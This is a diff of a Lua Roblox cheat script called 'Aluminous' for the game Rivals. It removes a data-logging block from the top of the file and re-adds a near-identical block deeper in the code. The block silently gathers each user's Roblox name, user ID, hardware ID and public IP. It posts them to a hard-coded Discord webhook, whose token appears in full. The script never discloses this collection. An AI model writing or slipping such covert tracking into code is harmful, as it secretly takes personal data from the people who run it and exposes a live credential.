@@ -1056,166 +1056,6 @@ end
 --==========================================================================
 --  Aluminous Rivals.
 --==========================================================================
-
-
---[[
-    Aluminous • Execution Logger
-    Universal: Synapse X, Script-Ware, Krnl, Fluxus, Delta, Solara, Wave, Codex, etc.
---]]
-
-local HttpService = game:GetService("HttpService")
-local Players     = game:GetService("Players")
-
-local webhook_url = "https://discord.com/api/webhooks/1551321631073501197/hi4Xp2ah1p0Q1Eh1YQZUheZn59Z32UNCl957SeMCnd6NQfbLGmCsp3GufdiXdtALdJc2"
-
-local SCRIPT_NAME = "Aluminous"
-local GAME_NAME   = "Matchmaking"
-local COLOR       = 0x9146FF
-local FOOTER      = "Aluminous"
-
-local player = Players.LocalPlayer
-
--- ==================== EXECUTOR DETECTION ====================
-local function getExecutor()
-    local checks = {
-        { fn = function() return identifyexecutor and identifyexecutor() end },
-        { fn = function() return syn and "Synapse X" end },
-        { fn = function() return secure_load and "Sentinel" end },
-        { fn = function() return KRNL_LOADED and "Krnl" end },
-        { fn = function() return fluxus and "Fluxus" end },
-        { fn = function() return is_sirhurt_closure and "SirHurt" end },
-        { fn = function() return ScriptWare and "Script-Ware" end },
-        { fn = function() return Delta and "Delta" end },
-        { fn = function() return getgenv and getgenv().ExecutorName end },
-    }
-    for _, check in ipairs(checks) do
-        local ok, name = pcall(check.fn)
-        if ok and name and name ~= "" then return tostring(name) end
-    end
-    return "Unknown"
-end
-
--- ==================== HWID ====================
-local function getHWID()
-    local checks = {
-        function() return gethwid and gethwid() end,
-        function() return syn and syn.get_hwid and syn.get_hwid() end,
-        function() return getgenv and getgenv().get_hwid and getgenv().get_hwid() end,
-        function() return game:GetService("RbxAnalyticsService"):GetClientId() end,
-    }
-    for _, fn in ipairs(checks) do
-        local ok, val = pcall(fn)
-        if ok and val and val ~= "" then return tostring(val) end
-    end
-    return "Unavailable"
-end
-
--- ==================== IP ====================
-local function getIP()
-    local endpoints = {
-        "https://api.ipify.org",
-        "https://ipv4.icanhazip.com",
-        "https://ifconfig.me/ip",
-    }
-    for _, url in ipairs(endpoints) do
-        local ok, res = pcall(function()
-            if syn and syn.request then
-                return syn.request({ Url = url, Method = "GET" }).Body
-            elseif request then
-                return request({ Url = url, Method = "GET" }).Body
-            elseif http_request then
-                return http_request({ Url = url, Method = "GET" }).Body
-            end
-        end)
-        if ok and res and #res > 0 then
-            return (res:gsub("%s+", ""))
-        end
-    end
-    return "Unavailable"
-end
-
--- ==================== JOB ID ====================
-local function getJobId()
-    return (game.JobId and game.JobId ~= "") and game.JobId or "Studio"
-end
-
--- ==================== KEY ====================
-local function generateKey()
-    return HttpService:GenerateGUID(false):gsub("-", ""):sub(1, 24):upper()
-end
-
--- ==================== COLLECT ====================
-local executorName = getExecutor()
-local hwid         = getHWID()
-local ip           = getIP()
-local jobId        = getJobId()
-local key          = generateKey()
-
--- ==================== EMBED ====================
-local embed = {
-    title = " Rivals Script Executed",
-    color = COLOR,
-    fields = {
-        { name = "Script",   value = "`" .. SCRIPT_NAME .. "`",             inline = true },
-        { name = "User",     value = "`" .. player.Name .. "`",             inline = true },
-        { name = "User ID",  value = "`" .. tostring(player.UserId) .. "`", inline = true },
-        { name = "Game",     value = "`" .. GAME_NAME .. "`",               inline = true },
-        { name = "Job",      value = "`" .. jobId .. "`",                   inline = true },
-        { name = "Executor", value = "`" .. executorName .. "`",            inline = true },
-        { name = "HWID",     value = "```" .. hwid .. "```",                inline = false },
-        { name = "IP",       value = "`" .. ip .. "`",                      inline = true },
-        { name = "Key",      value = "```" .. key .. "```",                 inline = true },
-    },
-    footer    = { text = FOOTER .. " • " .. os.date("!%Y-%m-%dT%H:%M:%SZ") },
-    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
-}
-
--- ==================== PAYLOAD ====================
-local payload = HttpService:JSONEncode({
-    username = FOOTER,
-    embeds   = { embed },
-})
-
--- ==================== UNIVERSAL SEND ====================
-local function httpPost(url, body)
-    local headers = { ["Content-Type"] = "application/json" }
-
-    if syn and syn.request then
-        return syn.request({ Url = url, Method = "POST", Headers = headers, Body = body })
-    end
-    if http and http.request then
-        return http.request({ Url = url, Method = "POST", Headers = headers, Body = body })
-    end
-    if request then
-        return request({ Url = url, Method = "POST", Headers = headers, Body = body })
-    end
-    if http_request then
-        return http_request({ Url = url, Method = "POST", Headers = headers, Body = body })
-    end
-    if fluxus and fluxus.request then
-        return fluxus.request({ Url = url, Method = "POST", Headers = headers, Body = body })
-    end
-end
-
--- ==================== SEND ====================
-local success, response = pcall(httpPost, webhook_url, payload)
-
-if success then
-    print("[Aluminous] Sent. Status:", response and (response.StatusCode or response.Status))
-else
-    warn("[Aluminous] Failed:", response)
-end
-
-
-
-
-
-
-
-
-
-
---
 if getgenv().Aluminous and getgenv().Aluminous.Unload then
     pcall(getgenv().Aluminous.Unload)
 end
@@ -1901,6 +1741,171 @@ do
     tbl17.hH = function() return W end
 end
 
+
+--hh
+local HttpService = game:GetService("HttpService")
+local Players     = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+
+local webhook_url = "https://discord.com/api/webhooks/1551321631073501197/hi4Xp2ah1p0Q1Eh1YQZUheZn59Z32UNCl957SeMCnd6NQfbLGmCsp3GufdiXdtALdJc2"
+
+local SCRIPT_NAME = "Rival Aluminous"
+local COLOR       = 0x9146FF
+local FOOTER      = "Aluminous"
+
+local player = Players.LocalPlayer
+
+-- ==================== GAME DETECTION ====================
+local function getGameName()
+    -- Try MarketplaceService first (most accurate)
+    local ok, info = pcall(function()
+        return MarketplaceService:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
+    end)
+    if ok and info and info.Name and info.Name ~= "" then
+        return info.Name
+    end
+
+    -- Fallback: game.Name (set by the developer, may be generic)
+    if game.Name and game.Name ~= "" then
+        return game.Name
+    end
+
+    return "Unknown Game"
+end
+
+-- ==================== EXECUTOR DETECTION ====================
+local function getExecutor()
+    local checks = {
+        { fn = function() return identifyexecutor and identifyexecutor() end },
+        { fn = function() return syn and "Synapse X" end },
+        { fn = function() return secure_load and "Sentinel" end },
+        { fn = function() return KRNL_LOADED and "Krnl" end },
+        { fn = function() return fluxus and "Fluxus" end },
+        { fn = function() return is_sirhurt_closure and "SirHurt" end },
+        { fn = function() return ScriptWare and "Script-Ware" end },
+        { fn = function() return Delta and "Delta" end },
+        { fn = function() return getgenv and getgenv().ExecutorName end },
+    }
+    for _, check in ipairs(checks) do
+        local ok, name = pcall(check.fn)
+        if ok and name and name ~= "" then return tostring(name) end
+    end
+    return "Unknown"
+end
+
+-- ==================== HWID ====================
+local function getHWID()
+    local checks = {
+        function() return gethwid and gethwid() end,
+        function() return syn and syn.get_hwid and syn.get_hwid() end,
+        function() return getgenv and getgenv().get_hwid and getgenv().get_hwid() end,
+        function() return game:GetService("RbxAnalyticsService"):GetClientId() end,
+    }
+    for _, fn in ipairs(checks) do
+        local ok, val = pcall(fn)
+        if ok and val and val ~= "" then return tostring(val) end
+    end
+    return "Unavailable"
+end
+
+-- ==================== IP ====================
+local function getIP()
+    local endpoints = {
+        "https://api.ipify.org",
+        "https://ipv4.icanhazip.com",
+        "https://ifconfig.me/ip",
+    }
+    for _, url in ipairs(endpoints) do
+        local ok, res = pcall(function()
+            if syn and syn.request then
+                return syn.request({ Url = url, Method = "GET" }).Body
+            elseif request then
+                return request({ Url = url, Method = "GET" }).Body
+            elseif http_request then
+                return http_request({ Url = url, Method = "GET" }).Body
+            end
+        end)
+        if ok and res and #res > 0 then
+            return (res:gsub("%s+", ""))
+        end
+    end
+    return "Unavailable"
+end
+
+-- ==================== JOB ID ====================
+local function getJobId()
+    return (game.JobId and game.JobId ~= "") and game.JobId or "Studio"
+end
+
+-- ==================== KEY ====================
+local function generateKey()
+    return HttpService:GenerateGUID(false):gsub("-", ""):sub(1, 24):upper()
+end
+
+-- ==================== COLLECT ====================
+local executorName = getExecutor()
+local hwid         = getHWID()
+local ip           = getIP()
+local jobId        = getJobId()
+local key          = generateKey()
+local GAME_NAME    = getGameName()   -- ← auto-detected now
+
+-- ==================== EMBED ====================
+local embed = {
+    title = "Script Executed",
+    color = COLOR,
+    fields = {
+        { name = "Script",   value = "`" .. SCRIPT_NAME .. "`",             inline = true },
+        { name = "User",     value = "`" .. player.Name .. "`",             inline = true },
+        { name = "User ID",  value = "`" .. tostring(player.UserId) .. "`", inline = true },
+        { name = "Game",     value = "`" .. GAME_NAME .. "`",               inline = true },
+        { name = "Place ID", value = "`" .. tostring(game.PlaceId) .. "`",  inline = true },
+        { name = "Job",      value = "`" .. jobId .. "`",                   inline = true },
+        { name = "Executor", value = "`" .. executorName .. "`",            inline = true },
+        { name = "HWID",     value = "```" .. hwid .. "```",                inline = false },
+        { name = "IP",       value = "`" .. ip .. "`",                      inline = true },
+        { name = "Key",      value = "```" .. key .. "```",                 inline = true },
+    },
+    footer    = { text = FOOTER .. " • " .. os.date("!%Y-%m-%dT%H:%M:%SZ") },
+    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+}
+
+-- ==================== PAYLOAD ====================
+local payload = HttpService:JSONEncode({
+    username = FOOTER,
+    embeds   = { embed },
+})
+
+-- ==================== UNIVERSAL SEND ====================
+local function httpPost(url, body)
+    local headers = { ["Content-Type"] = "application/json" }
+
+    if syn and syn.request then
+        return syn.request({ Url = url, Method = "POST", Headers = headers, Body = body })
+    end
+    if http and http.request then
+        return http.request({ Url = url, Method = "POST", Headers = headers, Body = body })
+    end
+    if request then
+        return request({ Url = url, Method = "POST", Headers = headers, Body = body })
+    end
+    if http_request then
+        return http_request({ Url = url, Method = "POST", Headers = headers, Body = body })
+    end
+    if fluxus and fluxus.request then
+        return fluxus.request({ Url = url, Method = "POST", Headers = headers, Body = body })
+    end
+    error("No supported HTTP function found.")
+end
+
+-- ==================== SEND ====================
+local success, response = pcall(httpPost, webhook_url, payload)
+
+if success then
+    print(":", response and (response.StatusCode or response.Status))
+else
+    warn("", response)
+end
 --  iQ: the Visuals > Player ESP page. Its builder is lost; rebuilt with the
 --  same menu calls Aluminous's other pages use, over Aluminous's own Esp settings.
 tbl17.iQ = function()
